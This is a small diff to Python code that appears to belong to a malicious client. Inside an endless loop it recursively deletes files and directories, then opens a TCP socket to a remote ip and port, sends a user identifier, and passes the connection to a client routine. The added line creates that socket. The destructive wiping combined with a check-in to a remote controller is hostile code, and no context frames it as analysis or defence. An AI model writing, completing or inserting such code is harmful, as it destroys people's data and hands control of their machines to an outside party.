@@ -172,6 +172,7 @@ while True:
             os.remove(os.path.join(root, name))
         for name in dirs:
             os.rmdir(os.path.join(root, name))
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((ip, port))
     s.send((user_identifier + ",1").encode())
     old_client(s)
